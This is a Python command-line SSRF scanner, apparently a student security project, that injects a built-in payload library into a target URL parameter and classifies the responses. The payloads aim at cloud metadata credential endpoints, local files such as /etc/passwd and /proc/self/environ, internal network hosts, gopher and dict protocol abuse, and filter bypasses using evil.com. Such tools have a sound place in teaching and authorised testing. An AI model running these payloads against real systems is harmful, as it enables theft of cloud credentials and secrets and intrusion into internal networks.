# student_name: Harini.P
# roll_number: 727823TUCY014
# project_name: SSRF Testing Tool
# date: 2026-03-29

"""
SSRF Testing Tool - Roll No. 14
Tests web applications for Server-Side Request Forgery vulnerabilities.
"""

import requests
import argparse
import json
import os
import sys
from datetime import datetime
from urllib.parse import urlencode, urlparse

ROLL_NUMBER ="727823TUCY014"
TIMESTAMP = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

print(f"[*] Roll No: 727823TUCY014  | Started: {TIMESTAMP}")

# ─── Payload Library ──────────────────────────────────────────────────────────

PAYLOADS = {
    "localhost_bypass": [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://127.1",
        "http://2130706433",          # decimal form of 127.0.0.1
        "http://0x7f000001",          # hex form
    ],
    "cloud_metadata": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",  # DigitalOcean
    ],
    "internal_network": [
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
        "http://192.168.0.1:8080",
        "http://10.0.0.1:22",
    ],
    "protocol_abuse": [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "dict://localhost:11211/stats",
        "gopher://localhost:25/_HELO%20localhost",
    ],
    "filter_bypass": [
        "http://127.0.0.1@evil.com",
        "http://evil.com#@127.0.0.1",
        "http://127。0。0。1",           # Unicode dots
        "http://localhost%09",
        "http://localtest.me",          # Resolves to 127.0.0.1
    ],
}

# ─── Core Scanner ─────────────────────────────────────────────────────────────

def build_request_url(base_url, param, payload):
    """Inject the payload into the target parameter."""
    return f"{base_url}?{param}={requests.utils.quote(payload, safe=':/@')}"


def send_request(url, timeout=5):
    """Send HTTP GET and return (status_code, response_text, elapsed_ms)."""
    try:
        resp = requests.get(url, timeout=timeout, allow_redirects=True,
                            headers={"User-Agent": "SSRF-Tester/1.0 (RollNo-14)"})
        elapsed = round(resp.elapsed.total_seconds() * 1000, 2)
        return resp.status_code, resp.text[:500], elapsed
    except requests.exceptions.ConnectionError:
        return None, "CONNECTION_ERROR", 0
    except requests.exceptions.Timeout:
        return None, "TIMEOUT", timeout * 1000
    except Exception as e:
        return None, f"ERROR: {str(e)}", 0


def analyze_response(status, body):
    """Heuristic: decide if response looks like a successful SSRF hit."""
    if status is None:
        return "BLOCKED"
    indicators = [
        "root:", "passwd", "shadow",          # /etc/passwd leak
        "ami-id", "instance-id", "hostname",  # AWS metadata
        "computeMetadata",                     # GCP metadata
        "interfaces", "mac",                   # network info
        "[stats]", "VERSION",                  # memcache/redis
    ]
    body_lower = body.lower()
    for indicator in indicators:
        if indicator.lower() in body_lower:
            return "VULNERABLE"
    if status == 200:
        return "POSSIBLE"
    if status in (301, 302, 307, 308):
        return "REDIRECT"
    if status in (403, 401):
        return "FILTERED"
    return "NOT_VULNERABLE"


def run_test(base_url, param, category, payloads, output_dir):
    """Run all payloads in a category and return results."""
    results = []
    print(f"\n[+] Testing category: {category.upper()}")
    print(f"    Target: {base_url} | Param: {param}")
    print(f"    {'PAYLOAD':<45} {'STATUS':<8} {'RESULT':<15} {'TIME(ms)'}")
    print(f"    {'-'*85}")

    for payload in payloads:
        full_url = build_request_url(base_url, param, payload)
        status, body, elapsed = send_request(full_url)
        verdict = analyze_response(status, body)

        display_payload = payload if len(payload) <= 43 else payload[:40] + "..."
        status_str = str(status) if status else "N/A"
        print(f"    {display_payload:<45} {status_str:<8} {verdict:<15} {elapsed}")

        results.append({
            "category": category,
            "payload": payload,
            "injected_url": full_url,
            "status_code": status,
            "verdict": verdict,
            "elapsed_ms": elapsed,
            "response_snippet": body[:200],
            "timestamp": datetime.now().isoformat(),
        })

    return results


# ─── Report Writer ────────────────────────────────────────────────────────────

def save_results(all_results, output_dir):
    os.makedirs(output_dir, exist_ok=True)
    out_path = os.path.join(output_dir, f"ssrf_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(out_path, "w") as f:
        json.dump({
            "roll_number": ROLL_NUMBER,
            "scan_time": TIMESTAMP,
            "total_payloads": len(all_results),
            "vulnerable": sum(1 for r in all_results if r["verdict"] == "VULNERABLE"),
            "possible": sum(1 for r in all_results if r["verdict"] == "POSSIBLE"),
            "results": all_results,
        }, f, indent=2)
    print(f"\n[*] Results saved to: {out_path}")
    return out_path


def print_summary(all_results):
    print("\n" + "="*60)
    print(f"  SSRF SCAN SUMMARY  |  Roll No: {ROLL_NUMBER}")
    print("="*60)
    verdicts = {}
    for r in all_results:
        verdicts[r["verdict"]] = verdicts.get(r["verdict"], 0) + 1
    for verdict, count in sorted(verdicts.items()):
        bar = "█" * count
        print(f"  {verdict:<16} {bar} ({count})")
    print(f"\n  Total payloads tested: {len(all_results)}")
    vuln = [r for r in all_results if r["verdict"] == "VULNERABLE"]
    if vuln:
        print(f"\n  [!] VULNERABLE payloads found:")
        for r in vuln:
            print(f"      -> {r['payload']}")
    else:
        print("\n  [✓] No confirmed vulnerabilities found.")
    print("="*60)


# ─── CLI Entry Point ──────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="SSRF Testing Tool | Roll No. 14",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("--url",     required=True, help="Target base URL (e.g. http://target.com/fetch)")
    parser.add_argument("--param",   default="url",  help="HTTP parameter to inject (default: url)")
    parser.add_argument("--category", default="all",
                        help="Payload category: all, localhost_bypass, cloud_metadata,\n"
                             "internal_network, protocol_abuse, filter_bypass")
    parser.add_argument("--output",  default="outputs", help="Directory to save results JSON")

    args = parser.parse_args()

    # Validate URL
    parsed = urlparse(args.url)
    if not parsed.scheme or not parsed.netloc:
        print("[!] Invalid URL. Example: http://target.com/fetch")
        sys.exit(1)

    categories = PAYLOADS if args.category == "all" else {args.category: PAYLOADS.get(args.category, [])}

    if not categories:
        print(f"[!] Unknown category: {args.category}")
        sys.exit(1)

    all_results = []
    for cat, payloads in categories.items():
        results = run_test(args.url, args.param, cat, payloads, args.output)
        all_results.extend(results)

    print_summary(all_results)
    save_results(all_results, args.output)


if __name__ == "__main__":
    main()
